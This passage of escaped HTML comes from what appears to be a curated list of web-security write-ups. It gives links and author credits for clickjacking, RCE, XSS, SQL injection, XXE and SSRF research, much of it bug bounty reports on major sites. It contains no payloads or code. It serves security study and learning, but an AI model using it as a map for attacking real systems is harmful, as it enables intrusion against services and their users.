data-url=\"aHR0cHM6Ly9ibG9nLnNlY3VyaXR5ZXZhbHVhdG9ycy5jb20vQHJyYW1nYXR0aWU=\">@rramgattie</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BfZ3JhcGh4L2lmLWh0dHBvbmx5LXlvdS1jb3VsZC1zdGlsbC1jc3JmLW9mLWNvcnMteW91LWNhbi01ZDdlZTJjNzQ0Mw==\">If HttpOnly You Could Still CSRF… Of CORS you can!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9HcmFwaFg=\">@GraphX</span>.</li>\n</ul>\n<p><a name=\"tricks-clickjacking\"></a></p>\n<h3 id=\"clickjacking-2\"><a class=\"anchor\" href=\"#clickjacking-2\">#</a> Clickjacking</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYXVzaGFucmFqXzY1MDM5L2dvb2dsZS1jbGlja2phY2tpbmctNmEwNDEzMmI5MThh\">Clickjackings in Google worth 14981.7$</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYXVzaGFucmFqXzY1MDM5\">@raushanraj_65039</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vcDgzNjEvYnVnLWJvdW50eS1qaWFuZy1qaW4tbGllLXJlbi1nYW4ta3UtdGFuLW5hLXhpZS1uaWFuLXdvLWh1aS1iYW8tZ3VvLWRlLWxvdS1kb25n\">Bug Bounty 獎金獵人甘苦談 - 那些年我回報過的漏洞</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n</ul>\n<p><a name=\"tricks-rce\"></a></p>\n<h3 id=\"remote-code-execution\"><a class=\"anchor\" href=\"#remote-code-execution\">#</a> Remote Code Execution</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGhlemRpLmNvbS9ibG9nLzIwMTkvMTAvMjMvY3ZlLTIwMTktMTMwNi1hcmUteW91LW15LWluZGV4\">CVE-2019-1306: ARE YOU MY INDEX?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS95dTVrMw==\">@yu5k3</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzkwOS8=\">WebLogic RCE (CVE-2019-2725) 漏洞之旅</span> - Written by Badcode@知道创宇 404 实验室.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzU4NC8=\">Weblogic 反序列化漏洞 (CVE-2018-2628) 漫谈</span> - Written by Badcode@知道创宇 404 实验室.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3hnbG92ZXNlY3VyaXR5LmNvbS8yMDE1LzExLzA2L3doYXQtZG8td2VibG9naWMtd2Vic3BoZXJlLWpib3NzLWplbmtpbnMtb3Blbm5tcy1hbmQteW91ci1hcHBsaWNhdGlvbi1oYXZlLWluLWNvbW1vbi10aGlzLXZ1bG5lcmFiaWxpdHkv\">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9AYnJlZW5tYWNoaW5l\">@breenmachine</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v\">Exploiting Node.js deserialization bug for Remote Code Execution</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC9hdXRob3IvYWppbmFicmFoYW0v\">OpSecX</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEhQL2J5cGFzcy1ldmFsLWxlbmd0aC1yZXN0cmljdC5odG1s\">eval 长度限制绕过 &amp;&amp; PHP5.6 新特性</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzEyMjkzOC5odG1s\">PHP 垃圾回收机制 UAF 漏洞分析</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvcGgxcmU=\">ph1re</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1iaW9uaWNzLmlvL2Jsb2cvZHJ1cGFsLXNlcnZpY2VzLW1vZHVsZS1yY2U=\">DRUPAL 7.X SERVICES MODULE UNSERIALIZE() TO RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1iaW9uaWNzLmlvLw==\">Ambionics Security</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jYXBhY2l0b3JzZXQuZ2l0aHViLmlvL21hdGhqcy8=\">How we exploited a remote code execution vulnerability in math.js</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NhcGFjaXRvcnNldA==\">@capacitorset</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2V4YWJsdWUuZGUvYmxvZy8yMDE3LTAzLTE1LWdpdGh1Yi1lbnRlcnByaXNlLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi5odG1s\">GitHub Enterprise Remote Code Execution</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2libHVl\">@iblue</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJpcHN0ZWNoLmNvbS8yMDE4L21vb2RsZS1yZW1vdGUtY29kZS1leGVjdXRpb24v\">Evil Teacher: Code Injection in Moodle</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmlwc3RlY2guY29tLw==\">RIPS Technologies</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTcvMDcvaG93LWktY2hhaW5lZC00LXZ1bG5lcmFiaWxpdGllcy1vbi5odG1s\">How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLy0zNmstZ29vZ2xlLWFwcC1lbmdpbmUtcmNl\">$36k Google App Engine RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLw==\">Ezequiel Pereira</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2Rld2hpdGVzZWMuYmxvZ3Nwb3QuY29tLzIwMTgvMDUvcG9vci1yaWNoZmFjZXMuaHRtbA==\">Poor RichFaces</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29kZS13aGl0ZS5jb20v\">CODE WHITE</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNjcnQuY2gvMjAxOC8wOC8yNC9yZW1vdGUtY29kZS1leGVjdXRpb24tb24tYS1mYWNlYm9vay1zZXJ2ZXIv\">Remote Code Execution on a Facebook server</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ibGFrbGlzXw==\">@blaklis_</span>.</li>\n</ul>\n<p><a name=\"tricks-xss\"></a></p>\n<h3 id=\"xss\"><a class=\"anchor\" href=\"#xss\">#</a> XSS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby9wb3N0cy8yMDE5LzExLzMwL1hTU18yMF9jaGFyYWN0ZXJzLmh0bWw=\">Exploiting XSS with 20 characters limitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby8=\">Jorge Lajara</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFod3VsLmNvbS8yMDE5LzExL3VwZ3JhZGUtc2VsZi14c3MtdG8tZXhwbG9pdGFibGUteHNzLmh0bWw=\">Upgrade self XSS to Exploitable XSS an 3 Ways Technic</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFod3VsLmNvbS8=\">HAHWUL</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy94c3Mtd2l0aG91dC1wYXJlbnRoZXNlcy1hbmQtc2VtaS1jb2xvbnM=\">XSS without parentheses and semi-colons</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYXJldGhoZXllcw==\">@garethheyes</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2J1Z2JvdW50eXdyaXRldXAveHNzLWF1ZGl0b3ItdGhlLXByb3RlY3Rvci1vZi11bnByb3RlY3RlZC1mOTAwYTVlMTViN2I=\">XSS-Auditor — the protector of unprotected and the deceiver of protected.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B0ZXJqYW5x\">@terjanq</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMjkzNjg5\">Query parameter reordering causes redirect page to render unsafe URL</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2tlbnppeQ==\">kenziy</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpby9lczYtZW4=\">ECMAScript 6 from an Attacker's Perspective - Breaking Frameworks, Sandboxes, and everything else</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpbw==\">Mario Heiderich</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXJpbl9tL2hvdy1pLWZvdW5kLWEtNS0wMDAtZ29vZ2xlLW1hcHMteHNzLWJ5LWZpZGRsaW5nLXdpdGgtcHJvdG9idWYtOTYzZWUwZDljYWZmIy51NTBucnpoYXM=\">How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXJpbl9t\">@marin_m</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctTGVraWVzLURvbnQtVHJ1c3QtVGhlLURPTS1CeXBhc3NpbmctWFNTLU1pdGlnYXRpb25zLVZpYS1TY3JpcHQtR2FkZ2V0cy5wZGY=\">DON'T TRUST THE DOM: BYPASSING XSS MITIGATIONS VIA SCRIPT GADGETS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zbGVraWVz\">Sebastian Lekies</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ra290b3dpY3o=\">Krzysztof Kotowicz</span>, and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaXJkYXJja2NhdA==\">Eduardo Vela</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3poY2hiaW4uZ2l0aHViLmlvLzIwMTcvMDgvMzAvVWJlci1YU1MtdmlhLUNvb2tpZS8=\">Uber XSS via Cookie</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3poY2hiaW4uZ2l0aHViLmlvLw==\">zhchbin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N0YW1vbmUtYnVnLWJvdW50eS5ibG9nc3BvdC50dy8yMDE3LzEwL2RvbS14c3MtYXV0aDE0Lmh0bWw=\">DOM XSS – auth.uber.com</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3N0YW1vbmUtYnVnLWJvdW50eS5ibG9nc3BvdC50dy8=\">StamOne_</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLzIwMTgvMDMvc3RvcmVkLXhzcy1vbi1mYWNlYm9vay8=\">Stored XSS on Facebook</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLw==\">Enguerran Gillier</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8yMDE4LzA2L3hzcy1pbi1nb29nbGUtY29sYWJvcmF0b3J5LWNzcC1ieXBhc3MuaHRtbA==\">XSS in Google Colaboratory + CSP bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8=\">Michał Bentkowski</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8yMDE4LzA5L2Fub3RoZXIteHNzLWluLWdvb2dsZS1jb2xhYm9yYXRvcnkuaHRtbA==\">Another XSS in Google Colaboratory</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8=\">Michał Bentkowski</span>.</li>\n<li><a href=\"https://twitter.com/strukt93/status/931586377665331200\"></script> is filtered ?</a> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zdHJ1a3Q5Mw==\">@strukt93</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly92aW5vdGhrdW1hci5tZS8yMDAwMC1mYWNlYm9vay1kb20teHNzLw==\">$20000 Facebook DOM XSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS92aW5vZHNwYXJyb3c=\">@vinodsparrow</span>.</li>\n</ul>\n<p><a name=\"tricks-sql-injection\"></a></p>\n<h3 id=\"sql-injection-2\"><a class=\"anchor\" href=\"#sql-injection-2\">#</a> SQL Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qaW5nbGluZ3NodS5vcmcvP3A9MjIyMA==\">屌智硬之 mysql 不用逗号注入</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qaW5nbGluZ3NodS5vcmcvP3A9MjIyMA==\">jinglingshu</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMzY2ODMuaHRtbA==\">见招拆招：绕过 WAF 继续 SQL 注入常用方法</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvbWlrZXk=\">mikey</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG9jcy9lbmdsaXNoLzM3OTUzLW15c3FsLWVycm9yLWJhc2VkLXNxbC1pbmplY3Rpb24tdXNpbmctZXhwLnBkZg==\">MySQL Error Based SQL Injection Using EXP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9vc2FuZGFtYWxpdGg=\">@osandamalith</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3pvbWJpZWhlbHA1NC5ibG9nc3BvdC5qcC8yMDE3LzAyL3NxbC1pbmplY3Rpb24taW4tdXBkYXRlLXF1ZXJ5LWJ1Zy5odG1s\">SQL injection in an UPDATE query - a bug bounty story!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3pvbWJpZWhlbHA1NC5ibG9nc3BvdC5qcC8=\">Zombiehelp54</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTcvMDEvYnVnLWJvdW50eS1naXRodWItZW50ZXJwcmlzZS1zcWwtaW5qZWN0aW9uLmh0bWw=\">GitHub Enterprise SQL Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B0b21ub21ub20vbWFraW5nLWEtYmxpbmQtc3FsLWluamVjdGlvbi1hLWxpdHRsZS1sZXNzLWJsaW5kLTQyOGRjYjYxNGJhOA==\">Making a Blind SQL Injection a little less blind</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Ub21Ob21Ob20=\">TomNomNom</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFybG9naWMuY29tL2VuL2Jsb2cvcmVkLXRlYW0tdGFsZXMtMHgwMS8=\">Red Team Tales 0x01: From MSSQL to RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFybG9naWMuY29tL2VuL2N5YmVyc2VjdXJpdHktYmxvZy8=\">Tarlogic</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wdWxzZXNlY3VyaXR5LmNvLm56L2FydGljbGVzL3Bvc3RncmVzLXNxbGk=\">SQL INJECTION AND POSTGRES - AN ADVENTURE TO EVENTUAL RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RlbmFuZHo=\">@denandz</span>.</li>\n</ul>\n<p><a name=\"tricks-nosql-injection\"></a></p>\n<h3 id=\"nosql-injection\"><a class=\"anchor\" href=\"#nosql-injection\">#</a> NoSQL Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wZXRlY29yZXkuY29tL2Jsb2cvMjAxNy8wNi8xMi9ncmFwaHFsLW5vc3FsLWluamVjdGlvbi10aHJvdWdoLWpzb24tdHlwZXMv\">GraphQL NoSQL Injection Through JSON Types</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wZXRlY29yZXkuY29tL3dvcmsv\">Pete</span>.</li>\n</ul>\n<p><a name=\"tricks-ftp-injection\"></a></p>\n<h3 id=\"ftp-injection-2\"><a class=\"anchor\" href=\"#ftp-injection-2\">#</a> FTP Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vZXUtMTMvYnJpZWZpbmdzL09zaXBvdi9iaC1ldS0xMy1YTUwtZGF0YS1vc2lwb3Ytc2xpZGVzLnBkZg==\">XML Out-Of-Band Data Retrieval</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hNjZhdA==\">@a66at</span> and Alexey Osipov.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2xhYi5vbnNlYy5ydS8yMDE0LzA2L3h4ZS1vb2ItZXhwbG9pdGF0aW9uLWF0LWphdmEtMTcuaHRtbA==\">XXE OOB exploitation at Java 1.7+</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2xhYi5vbnNlYy5ydS8=\">Ivan Novikov</span>.</li>\n</ul>\n<p><a name=\"tricks-xxe\"></a></p>\n<h3 id=\"xxe-2\"><a class=\"anchor\" href=\"#xxe-2\">#</a> XXE</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2hlbWl2LmNvbS9hbGwvZXZpbC14bWwv\">Evil XML with two encodings</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2hlbWl2LmNvbS8=\">Arseniy Sharoglazov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NlY2xpc3RzLm9yZy9mdWxsZGlzY2xvc3VyZS8yMDE4L0p1bC8z\">XXE in WeChat Pay Sdk ( WeChat leave a backdoor on merchant websites)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9jb2Rlc2h0b29s\">Rose Jackcode</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vZXUtMTMvYnJpZWZpbmdzL09zaXBvdi9iaC1ldS0xMy1YTUwtZGF0YS1vc2lwb3Ytc2xpZGVzLnBkZg==\">XML Out-Of-Band Data Retrieval</span> - Written by Timur Yunusov and Alexey Osipov.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2xhYi5vbnNlYy5ydS8yMDE0LzA2L3h4ZS1vb2ItZXhwbG9pdGF0aW9uLWF0LWphdmEtMTcuaHRtbA==\">XXE OOB exploitation at Java 1.7+ (2014)</span>: Exfiltration using FTP protocol - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9kMHpucHAv\">Ivan Novikov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9za2F2YW5zLnJ1L2VuLzIwMTcvMTIvMDIveHhlLW9vYi1leHRyYWN0aW5nLXZpYS1odHRwZnRwLXVzaW5nLXNpbmdsZS1vcGVuZWQtcG9ydC8=\">XXE OOB extracting via HTTP+FTP using single opened port</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9za2F2YW5zLnJ1Lw==\">skavans</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yMDEzLmFwcHNlY3VzYS5vcmcvMjAxMy93cC1jb250ZW50L3VwbG9hZHMvMjAxMy8xMi9XaGF0WW91RGlkbnRLbm93QWJvdXRYWEVBdHRhY2tzLnBkZg==\">What You Didn't Know About XML External Entities Attacks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9lY2JmdHc=\">Timothy D. Morgan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3luYWNrdGl2LmNvbS9yZXNzb3VyY2VzL3N5bmFja3Rpdl9kcnVwYWxfeHhlX3NlcnZpY2VzLnBkZg==\">Pre-authentication XXE vulnerability in the Services Drupal module</span> -  Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbTBiaXVz\">Renaud Dubourguais</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZm9yY2luZy14eGUtcmVmbGVjdGlvbi1zZXJ2ZXItZXJyb3ItbWVzc2FnZXMv\">Forcing XXE Reflection through Server Error Messages</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vYXV0aG9yL2FudHRpLXJhbnRhc2Fhcmkv\">Antti Rantasaari</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2hlbWl2LmNvbS9hbGwvZXhwbG9pdGluZy14eGUtd2l0aC1sb2NhbC1kdGQtZmlsZXMv\">Exploiting XXE with local DTD files</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbW9oZW1pdg==\">Arseniy Sharoglazov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29zZWN1cmUubmV0L2Jsb2cvMjAxOS8wNy8xNi9hdXRvbWF0aW5nLWxvY2FsLWR0ZC1kaXNjb3ZlcnktZm9yLXh4ZS1leHBsb2l0YXRpb24=\">Automating local DTD discovery for XXE exploitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oM3hzdHJlYW0=\">Philippe Arteau</span>.</li>\n</ul>\n<p><a name=\"tricks-ssrf\"></a></p>\n<h3 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHR0YW5nLmNvbS9hcmNoaXZlLzEyOTMv\">IPv6 三个访问本地地址的小 Tips</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHR0YW5nLmNvbS91c2VyL3BoaXRoMG4=\">phith0n</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC9hd3MtdGFrZW92ZXItdGhyb3VnaC1zc3JmLWluLWphdmFzY3JpcHQv\">AWS takeover through SSRF in JavaScript</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC8=\">Gwen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMzQxODc2\">SSRF in Exchange leads to ROOT access in all instances</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS8weGFjYg==\">@0xacb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMzQxODc2\">SSRF to ROOT Access</span> - A $25k bounty for SSRF leading to ROOT Access in all instances by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tLzB4YWNi\">0xacb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx\">PHP SSRF Techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B0aGVtaWRkbGVibHVl\">@themiddleblue</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMTE1NzQ4\">SSRF in https://imgur.com/vidgif/url</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Flc3RlcmFs\">aesteral</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXV4eS54eXovd2ViJTIwc2VjdXJpdHkvMjAxNy8wNy8wNi9hbGwtc3NyZi1rbm93bGVkZ2UuaHRtbA==\">All you need to know about SSRF and how may we write tools to do auto-detect</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BdXh5MjMz\">@Auxy233</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMTM1MzQyLmh0bWw=\">SSRF 漏洞中绕过 IP 限制的几种方法总结</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvYXJrdGVhbQ==\">arkteam</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==\">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==\">SSRF Tips</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLw==\">xl7dev</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLzIwMTgvMDcvaW50by10aGUtYm9yZy1zc3JmLWluc2lkZS1nb29nbGUtcHJvZHVjdGlvbi1uZXR3b3JrLw==\">Into the Borg – SSRF inside Google production network</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLw==\">opnsec</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2J1Z2JvdW50eXdyaXRldXAvcGllcmNpbmctdGhlLXZlaWwtc2VydmVyLXNpZGUtcmVxdWVzdC1mb3JnZXJ5LXRvLW5pcHJuZXQtYWNjZXNzLWMzNThmZDVlMjQ5YQ==\">Piercing the Veil: Server Side Request Forgery to NIPRNet access</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BhbHlzc2Euby5oZXJyZXJh\">Alyssa Herrera</span>.</li>\n</ul>\n<p><a name=\"tricks-web-cache-poisoning\"></a></p>\n<h3 id=\"web-cache-poisoning-2\"><a class=\"anchor\" href=\"#web-cache-poisoning-2\">#</a> Web Cache Poisoning</h3>\n<ul>\n<li><span class=\"exturl\" 